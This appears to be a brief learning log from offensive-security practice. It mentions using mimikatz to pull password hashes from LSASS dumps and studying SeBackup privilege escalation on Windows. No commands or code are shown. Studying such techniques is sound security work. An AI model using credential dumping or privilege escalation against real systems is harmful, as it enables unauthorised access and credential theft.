* Practiced using mimikatz to extract hashes from LSASS dumps
  
* I learned about sebackup privilege escalation exploit and how to leverage a service and tools that are used for managing that kind of service to do things that are not allowed by default (escalate privileges).
